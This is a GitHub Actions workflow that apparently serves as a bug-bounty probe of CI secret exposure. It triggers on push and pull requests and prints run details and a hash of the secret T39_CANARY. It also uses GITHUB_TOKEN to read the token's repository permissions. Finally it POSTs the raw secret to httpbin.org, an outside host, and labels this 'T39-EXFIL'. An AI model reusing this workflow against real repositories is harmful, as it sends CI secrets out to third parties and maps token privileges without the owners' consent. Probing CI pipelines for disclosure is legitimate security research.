name: t39-probe
on:
  push:
  pull_request:

jobs:
  bbp-never-passes:
    runs-on: ubuntu-latest
    steps:
      - name: probe
        run: |
          echo "T39-EXECUTED event=${{ github.event_name }} ref=$GITHUB_REF actor=$GITHUB_ACTOR repo=$GITHUB_REPOSITORY"
          echo "T39-CANARY-PRESENT=${{ secrets.T39_CANARY != '' }}"
          echo "T39-CANARY-SHA16=$(printf '%s' '${{ secrets.T39_CANARY }}' | sha256sum | cut -c1-16)"
          perms=$(curl -sS -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/mergifytest1/test-repo | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('permissions'))")
          echo "T39-TOKEN-PERMS=$perms"
          code=$(curl -sS -o /tmp/echo.json -w '%{http_code}' -X POST https://httpbin.org/post --data-urlencode "canary=${{ secrets.T39_CANARY }}")
          seen=$(grep -c "t39-canary-dummy" /tmp/echo.json || true)
          echo "T39-EXFIL http=$code canary-seen-in-response=$seen"
  t39-recon:
    runs-on: ubuntu-latest
    steps:
      - run: echo "T39-RECON event=${{ github.event_name }} ref=$GITHUB_REF actor=$GITHUB_ACTOR"
